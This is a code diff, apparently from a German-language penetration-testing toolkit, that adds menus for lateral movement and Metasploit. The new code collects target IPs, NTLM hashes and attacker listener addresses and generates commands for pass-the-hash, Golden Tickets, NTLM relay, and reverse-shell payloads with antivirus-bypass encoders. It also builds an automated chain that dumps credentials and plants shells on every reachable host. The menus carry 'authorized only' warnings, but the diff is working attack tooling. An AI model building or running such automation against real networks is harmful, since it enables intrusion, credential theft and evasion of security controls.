@@ -3702,6 +3702,392 @@ async def menu_anon():
         wait_key()
 
 
+async def menu_lateral():
+    """Lateral Movement Wizard — PTH, NTLM Relay, Pivot, Auto-Chain."""
+    while True:
+        banner()
+        section("🔀  LATERAL MOVEMENT", "PTH · PTT · SMBExec · WMIExec · NTLM Relay · Pivot · Auto-Chain")
+        print(f"  {RD}{B}⛔  NUR auf autorisierten Netzwerken!{R}\n")
+        menu_item(" 1", "🔑  Pass-the-Hash Wizard",        "⛔", "NTLM Hash → Shell ohne Passwort (alle Methoden)")
+        menu_item(" 2", "🎫  Pass-the-Ticket (Kerberos)",  "⛔", "Ticket inject / Golden Ticket / AS-REP Roast")
+        menu_item(" 3", "📡  NTLM Relay Wizard",           "⛔", "Responder + ntlmrelayx + Coercion + mitm6")
+        menu_item(" 4", "🖥️   DCOM Remote Exec",            "🔴", "Shell via DCOM (kein Service, lautlos)")
+        menu_item(" 5", "🌐  Network Pivot Setup",         "🔴", "sshuttle / SOCKS / ligolo-ng / chisel")
+        menu_item(" 6", "🔗  Auto-Lateral Chain",          "⛔", "spray → PTH → Dump → Repeat (vollautomatisch)")
+        menu_item(" 0", "← Zurück", "")
+        print()
+
+        choice = prompt("lateral")
+        if choice == "0":
+            return
+        clr()
+
+        if choice == "1":
+            banner(); section("🔑  PASS-THE-HASH WIZARD", "NTLM Hash direkt nutzen — kein Passwort-Cracking")
+            info_box([
+                "Pass-the-Hash = NTLM Hash direkt für Auth nutzen.",
+                "Kein Passwort-Cracking nötig — Hash ist genug!",
+                "",
+                "Hash holen via: LSASS Dump (Post-Exploit →2), secretsdump, pypykatz",
+                "Format: NTLM Hash = 32 Hex-Zeichen, z.B. 8846f7eaee8fb117ad06bdd830b7586c",
+                "",
+                "Dann: shell, hashdump, weitere Hashes, lateral movement",
+            ])
+            print()
+            target   = ask("Ziel-IP", required=True)
+            if not target: wait_key(); continue
+            domain   = ask("Domain (oder Workgroup / WORKGROUP)", "WORKGROUP")
+            username = ask("Benutzername", "Administrator")
+            nt_hash  = ask("NTLM Hash (32 Hex-Zeichen)", required=True)
+            if not nt_hash: wait_key(); continue
+            kali_ip  = ask("Kali IP", "10.10.10.1")
+            print()
+            from tools.network.lateral_movement import pth_wizard
+            await run_tool_live(pth_wizard(target, domain, username, nt_hash, kali_ip))
+
+        elif choice == "2":
+            banner(); section("🎫  PASS-THE-TICKET", "Kerberos Tickets · Golden Ticket · Kerberoast")
+            info_box([
+                "Pass-the-Ticket = Kerberos Ticket direkt injizieren.",
+                "",
+                "Drei Wege:",
+                "  a) Ticket aus LSASS extrahieren (Rubeus) → injizieren",
+                "  b) Kerberoast → Hash cracken → Passwort",
+                "  c) Golden Ticket (krbtgt Hash) → unbegrenzte Domäne",
+                "",
+                "Golden Ticket braucht: krbtgt NTLM Hash + Domain SID",
+                "  → Holen via DCSync (AD-Menü → DCSync)",
+            ])
+            print()
+            target    = ask("Ziel-IP / DC", required=True)
+            if not target: wait_key(); continue
+            domain    = ask("Domain (z.B. corp.local)", required=True)
+            if not domain: wait_key(); continue
+            username  = ask("Benutzername", "Administrator")
+            krbtgt    = ask("krbtgt NTLM Hash (für Golden Ticket, leer lassen wenn unbekannt)", "")
+            ticket    = ask("Ticket-Datei (.ccache / .kirbi, leer lassen wenn keins)", "")
+            dc_ip     = ask("DC IP", target)
+            print()
+            from tools.network.lateral_movement import ptt_commands
+            cmds = ptt_commands(target, domain, username, krbtgt, ticket, dc_ip)
+            for method, cmd in cmds.items():
+                print(f"  {Y}[→] {method}:{R}")
+                print(f"  {C}{cmd}{R}\n")
+
+        elif choice == "3":
+            banner(); section("📡  NTLM RELAY WIZARD", "Responder + ntlmrelayx + Coercion")
+            info_box([
+                "NTLM Relay = abgefangene NTLM-Auth wird an Ziel weitergeleitet.",
+                "",
+                "Ablauf:",
+                "  1. Responder vergiftet LLMNR/NBT-NS → Clients schicken Auth",
+                "  2. ntlmrelayx leitet Auth weiter → Shell oder Hash oder DCSync",
+                "  3. Optional: Coercion (PetitPotam/PrinterBug) erzwingt Auth sofort",
+                "",
+                "Wichtig: Responder.conf → SMB=Off, HTTP=Off wenn ntlmrelayx läuft!",
+            ])
+            print()
+            interface    = ask("Netzwerk-Interface", "eth0")
+            target       = ask("Relay-Ziel IP", required=True)
+            if not target: wait_key(); continue
+            relay_target = ask("Weiterleitungs-Ziel IP (leer = gleich wie Ziel)", "")
+            print()
+            from tools.network.lateral_movement import show_ntlm_relay_wizard
+            await run_tool_live(show_ntlm_relay_wizard(interface, target, relay_target))
+
+        elif choice == "4":
+            banner(); section("🖥️  DCOM REMOTE EXEC", "Shell via DCOM — kein Service-Install, kein SMB-Login-Event")
+            info_box([
+                "DCOM = Distributed COM — Windows-Bordmittel für Remote-Ausführung.",
+                "Vorteil: kein Service-Install (PSExec), kein SMB Auth-Log.",
+                "Braucht: Admin-Credentials (Passwort oder Hash).",
+                "",
+                "Drei DCOM-Objekte: MMC20, ShellWindows, ShellBrowserWindow",
+            ])
+            print()
+            target   = ask("Ziel-IP", required=True)
+            if not target: wait_key(); continue
+            domain   = ask("Domain / WORKGROUP", "WORKGROUP")
+            username = ask("Benutzername", "Administrator")
+            password = ask("Passwort (oder NTLM Hash für PTH)")
+            print()
+            from tools.network.lateral_movement import dcom_exec_commands
+            cmds = dcom_exec_commands(target, domain, username, password)
+            for method, cmd in cmds.items():
+                print(f"  {Y}[→] {method}:{R}")
+                print(f"  {C}{cmd}{R}\n")
+
+        elif choice == "5":
+            banner(); section("🌐  NETWORK PIVOT SETUP", "sshuttle · SOCKS · ligolo-ng · chisel")
+            info_box([
+                "Pivot = vom kompromittierten Host aus ins interne Netz angreifen.",
+                "",
+                "sshuttle = transparenter Proxy, empfohlen wenn SSH vorhanden.",
+                "SOCKS + proxychains = Standard, für einzelne Tools.",
+                "ligolo-ng = moderner, schneller Tunnel, empfohlen für große Netze.",
+                "chisel = wenn kein SSH vorhanden.",
+            ])
+            print()
+            pivot_ip   = ask("IP des kompromittierten Hosts (Pivot)", required=True)
+            if not pivot_ip: wait_key(); continue
+            pivot_user = ask("SSH-User auf Pivot", "root")
+            ssh_key    = ask("SSH Key-Datei (leer = Passwort-Auth)", "")
+            subnet     = ask("Ziel-Subnetz", "192.168.1.0/24")
+            print()
+            from tools.network.lateral_movement import pivot_setup
+            setups = pivot_setup(pivot_ip, pivot_user, ssh_key, subnet)
+            for method, cmd in setups.items():
+                print(f"  {Y}[→] {method}:{R}")
+                for line in cmd.split("\n"):
+                    style = DIM if line.strip().startswith("#") else C
+                    print(f"  {style}{line}{R}")
+                print()
+
+        elif choice == "6":
+            banner(); section("🔗  AUTO-LATERAL CHAIN", "spray → PTH → Dump → Repeat")
+            info_box([
+                "Vollautomatische Lateral Movement Sequenz:",
+                "  Phase 1: SMB-Erreichbarkeit + PTH prüfen (alle Ziele)",
+                "  Phase 2: Hashes von erreichbaren Zielen dumpen (SAM)",
+                "  Phase 3: Reverse Shell auf alle erreichbaren Ziele",
+                "  Phase 4: Secretsdump (alle Credentials)",
+                "  Phase 5: BloodHound-Daten sammeln → Weg zum DA",
+                "",
+                "Ergebnis: vollständige Credentials-Map + Angriffspfade",
+            ])
+            print()
+            raw_targets = ask("Ziel-IPs (komma-getrennt oder CIDR)", required=True)
+            if not raw_targets: wait_key(); continue
+            targets = [t.strip() for t in raw_targets.replace(",", " ").split() if t.strip()]
+            domain   = ask("Domain / WORKGROUP", "WORKGROUP")
+            username = ask("Benutzername", "Administrator")
+            nt_hash  = ask("NTLM Hash", required=True)
+            if not nt_hash: wait_key(); continue
+            kali_ip  = ask("Kali IP", "10.10.10.1")
+            try:
+                lport = int(ask("Listener-Port", "4444"))
+            except ValueError:
+                lport = 4444
+            print()
+            from tools.network.lateral_movement import auto_lateral_chain
+            await run_tool_live(auto_lateral_chain(targets, domain, username, nt_hash, kali_ip, lport))
+
+        wait_key()
+
+
+async def menu_msf():
+    """Metasploit Framework — vollständiger MSF-Workflow."""
+    while True:
+        banner()
+        section("💣  METASPLOIT FRAMEWORK", "Payloads · Handler · Top-Exploits · Post-Modules · RC-Scripts")
+        print(f"  {RD}{B}⛔  NUR auf autorisierten Zielen!{R}\n")
+        menu_item(" 1", "🧬  msfvenom Payload Builder",    "⛔", "Windows/Linux/Web/Android — alle Formate")
+        menu_item(" 2", "📡  Multi/Handler starten",       "🔴", "Empfängt Meterpreter/Shells — fertige Befehle")
+        menu_item(" 3", "💥  Top Exploit Module",          "⛔", "EternalBlue, BlueKeep, PrintNightmare, Log4Shell...")
+        menu_item(" 4", "🔧  Post-Exploitation Module",    "🔴", "getsystem, hashdump, kiwi, autoroute, creds")
+        menu_item(" 5", "📜  Resource Script Generator",  "⛔", "Vollautomatisch: Exploit → Shell → Post-Exploit")
+        menu_item(" 6", "🗄️   MSF Datenbank Setup",         "🟡", "postgresql + msfdb init")
+        menu_item(" 0", "← Zurück", "")
+        print()
+
+        choice = prompt("msf")
+        if choice == "0":
+            return
+        clr()
+
+        if choice == "1":
+            banner(); section("🧬  MSFVENOM PAYLOAD BUILDER", "Windows · Linux · Web · Android · macOS")
+            info_box([
+                "msfvenom generiert Payloads die sich zurück zum Listener verbinden.",
+                "",
+                "LHOST = deine Kali IP (wo der Listener läuft)",
+                "LPORT = Port des Listeners (443 empfohlen — sieht wie HTTPS aus)",
+                "",
+                "AV-Bypass Methoden:",
+                "  shikata = x86 polymorphic encoder (mehrfach enkodieren)",
+                "  xor     = XOR dynamic encoder (x64)",
+                "  template= echte EXE als Wrapper nutzen (Icon + Signatur bleiben)",
+            ])
+            print()
+            lhost = ask("LHOST — deine Kali IP", required=True)
+            if not lhost: wait_key(); continue
+            try:
+                lport = int(ask("LPORT", "443"))
+            except ValueError:
+                lport = 443
+
+            print()
+            print(f"  {Y}Payload-Typ:{R}")
+            print(f"  {C}[1]{R} Windows EXE         {C}[2]{R} Windows PowerShell")
+            print(f"  {C}[3]{R} Windows HTA          {C}[4]{R} Windows Office Macro")
+            print(f"  {C}[5]{R} Windows DLL          {C}[6]{R} Windows ASPX Webshell")
+            print(f"  {C}[7]{R} Linux ELF            {C}[8]{R} Linux Bash")
+            print(f"  {C}[9]{R} Android APK          {C}[A]{R} Alle anzeigen")
+            print()
+            pt_map = {
+                "1": "windows_exe", "2": "windows_ps1", "3": "windows_hta",
+                "4": "windows_vba", "5": "windows_dll", "6": "windows_aspx",
+                "7": "linux_elf",   "8": "linux_bash",  "9": "android_apk",
+            }
+            sub = prompt("payload-typ")
+            print()
+            from tools.network.msf_integration import msfvenom_cmd, generate_payload_menu, PAYLOAD_FORMATS
+
+            if sub.lower() == "a" or sub not in pt_map:
+                await run_tool_live(generate_payload_menu(lhost, lport))
+            else:
+                pt = pt_map[sub]
+                av = ask("AV-Bypass [none / shikata / xor / template]", "none")
+                out = ask("Output-Dateiname", f"payload.{PAYLOAD_FORMATS[pt][1]}")
+                cmd = msfvenom_cmd(lhost, lport, pt, out, av)
+                print(f"\n  {G}[+] Befehl:{R}\n")
+                print(f"  {C}{cmd}{R}\n")
+                print(f"  {DIM}Handler danach starten: Option 2 in diesem Menü{R}")
+
+        elif choice == "2":
+            banner(); section("📡  MULTI/HANDLER", "Empfängt eingehende Meterpreter/Shell-Verbindungen")
+            info_box([
+                "Multi/Handler wartet auf eingehende Verbindungen vom Payload.",
+                "",
+                "LHOST + LPORT = gleich wie beim generierten Payload!",
+                "",
+                "Meterpreter = vollständige Session mit allen Post-Exploit-Modulen.",
+                "Nach Verbindung: 'help' für alle Befehle, 'getsystem' für SYSTEM.",
+            ])
+            print()
+            lhost = ask("LHOST — deine Kali IP", required=True)
+            if not lhost: wait_key(); continue
+            try:
+                lport = int(ask("LPORT", "443"))
+            except ValueError:
+                lport = 443
+
+            print()
+            print(f"  {Y}Payload-Typ:{R}")
+            print(f"  {C}[1]{R} windows/x64/meterpreter/reverse_tcp   (Standard)")
+            print(f"  {C}[2]{R} windows/x64/meterpreter/reverse_https  (HTTPS, AV-bypass)")
+            print(f"  {C}[3]{R} linux/x64/meterpreter/reverse_tcp")
+            print(f"  {C}[4]{R} java/meterpreter/reverse_tcp")
+            print()
+            payload_map = {
+                "1": "windows/x64/meterpreter/reverse_tcp",
+                "2": "windows/x64/meterpreter/reverse_https",
+                "3": "linux/x64/meterpreter/reverse_tcp",
+                "4": "java/meterpreter/reverse_tcp",
+            }
+            sub = prompt("payload")
+            payload = payload_map.get(sub, "windows/x64/meterpreter/reverse_tcp")
+            print()
+            from tools.network.msf_integration import handler_cmd, handler_rc_file
+            cmd = handler_cmd(lhost, lport, payload)
+            rc_content, rc_start = handler_rc_file(lhost, lport, payload)
+            print(f"  {G}[+] Handler starten (Einzeiler):{R}\n")
+            print(f"  {C}{cmd}{R}\n")
+            print(f"  {Y}[→] Oder als RC-Datei (empfohlen für mehrere Sessions):{R}")
+            print(f"  {C}echo '{rc_content[:80]}...' > /tmp/handler.rc{R}")
+            print(f"  {C}{rc_start}{R}")
+
+        elif choice == "3":
+            banner(); section("💥  TOP EXPLOIT MODULE", "Die wichtigsten MSF-Exploits")
+            info_box([
+                "Fertige msfconsole-Befehle für die gefährlichsten Exploits.",
+                "",
+                "Immer erst prüfen ob Ziel anfällig ist:",
+                "  → nmap -sV --script vuln <target>",
+                "  → PenKit → Netzwerk → Auto-Exploit Suggester",
+                "",
+                "⛔ NUR auf eigenen/autorisierten Systemen!",
+            ])
+            print()
+            lhost = ask("LHOST — deine Kali IP", "10.10.10.1")
+            try:
+                lport = int(ask("LPORT", "4444"))
+            except ValueError:
+                lport = 4444
+            print()
+            from tools.network.msf_integration import show_top_exploits
+            await run_tool_live(show_top_exploits(lhost, lport))
+
+        elif choice == "4":
+            banner(); section("🔧  POST-EXPLOITATION MODULE", "Meterpreter Befehle nach erstem Shell")
+            info_box([
+                "Post-Exploitation Module laufen in einer aktiven Meterpreter-Session.",
+                "",
+                "In msfconsole: sessions -l  →  sessions -i <ID>  →  Modul ausführen",
+                "",
+                "Wichtigste Befehle: getsystem, hashdump, load kiwi, creds_all",
+            ])
+            print()
+            print(f"  {Y}Kategorie:{R}")
+            print(f"  {C}[1]{R} Privilege Escalation  {C}[2]{R} Credential Harvesting")
+            print(f"  {C}[3]{R} Persistence            {C}[4]{R} Enumeration")
+            print(f"  {C}[5]{R} Lateral Movement       {C}[6]{R} Cleanup")
+            print(f"  {C}[A]{R} Alle anzeigen")
+            print()
+            cat_map = {
+                "1": "Privilege", "2": "Credential", "3": "Persistence",
+                "4": "Enumeration", "5": "Lateral", "6": "Cleanup",
+            }
+            sub = prompt("kategorie")
+            cat = "all" if sub.lower() == "a" or sub not in cat_map else cat_map[sub]
+            print()
+            from tools.network.msf_integration import show_post_modules
+            await run_tool_live(show_post_modules(cat))
+
+        elif choice == "5":
+            banner(); section("📜  RESOURCE SCRIPT GENERATOR", "Vollautomatisch: Exploit → Shell → Post-Modules")
+            info_box([
+                "RC-Script = automatisches MSF-Script das alle Schritte nacheinander ausführt.",
+                "",
+                "Starten: msfconsole -r /tmp/penkit_auto.rc",
+                "",
+                "Was das Script macht:",
+                "  1. Exploit ausführen",
+                "  2. Multi/Handler starten (für weitere Sessions)",
+                "  3. Nach Session: Post-Module automatisch ausführen",
+                "     (sysinfo, getsystem, hashdump, enum_domain, autoroute)",
+            ])
+            print()
+            lhost  = ask("LHOST — deine Kali IP", required=True)
+            if not lhost: wait_key(); continue
+            try:
+                lport = int(ask("LPORT", "4444"))
+            except ValueError:
+                lport = 4444
+            target = ask("Ziel-IP", required=True)
+            if not target: wait_key(); continue
+            module = ask("MSF Modul", "exploit/windows/smb/ms17_010_eternalblue")
+            payload = ask("Payload", "windows/x64/meterpreter/reverse_tcp")
+            print()
+            from tools.network.msf_integration import build_resource_script, build_post_rc
+            rc = build_resource_script(lhost, lport, target, module, payload)
+            post_rc = build_post_rc()
+            print(f"  {G}[+] RC-Script speichern und starten:{R}\n")
+            print(f"  {C}cat > /tmp/penkit_auto.rc << 'EOF'\n{rc}\nEOF{R}")
+            print(f"  {C}cat > /tmp/post.rc << 'EOF'\n{post_rc}\nEOF{R}")
+            print(f"\n  {Y}[→] Starten:{R}")
+            print(f"  {C}msfconsole -r /tmp/penkit_auto.rc{R}")
+
+        elif choice == "6":
+            banner(); section("🗄️  MSF DATENBANK SETUP", "postgresql + msfdb init")
+            info_box([
+                "Metasploit-DB speichert: Hosts, Services, Credentials, Loot.",
+                "Macht: workspace management, db_nmap, db_autopwn möglich.",
+                "",
+                "Nach Setup in msfconsole:",
+                "  db_status         — Verbindung prüfen",
+                "  db_import scan.xml — Nmap-Scan importieren",
+                "  hosts             — alle bekannten Hosts",
+                "  services          — alle gefundenen Services",
+                "  creds             — alle gefundenen Credentials",
+            ])
+            print()
+            from tools.network.msf_integration import setup_msfdb
+            await run_tool_live(setup_msfdb())
+
+        wait_key()
+
+
 def boot_sequence():
     clr()
     lines = [
@@ -3739,6 +4125,8 @@ async def main_menu():
         menu_item(" 9", "💀  C2 / RAT Payloads",     "⛔", "AMSI bypass, fileless shellcode, hollow, disguise")
         menu_item(" W", "🏰  Active Directory",      "⛔", "Kerberoast, PtH, BloodHound, DCSync, Golden Ticket")
         menu_item(" P", "🔥  Post-Exploitation",     "⛔", "WinPEAS, LSASS Dump, Persistence, Exfil, LOLBAS")
+        menu_item(" L", "🔀  Lateral Movement",      "⛔", "PTH, PTT, SMBExec, WMIExec, NTLM Relay, Pivot")
+        menu_item(" X", "💣  Metasploit",            "⛔", "Payloads, Handler, Top-Exploits, Post-Modules, RC")
         print(f"  {DIM}├{'─'*66}┤{R}")
         print(f"  {DIM}│{'  🔵  BLUE TEAM  /  🃏  JOKER':^66}│{R}")
         print(f"  {DIM}├{'─'*66}┤{R}")
@@ -3773,6 +4161,8 @@ async def main_menu():
             "9": menu_c2,
             "w": menu_ad, "W": menu_ad,
             "p": menu_postexploit, "P": menu_postexploit,
+            "l": menu_lateral, "L": menu_lateral,
+            "x": menu_msf, "X": menu_msf,
             "j": menu_joker, "J": menu_joker,
             "?": menu_assistant,
             "t": menu_tutorials, "T": menu_tutorials,
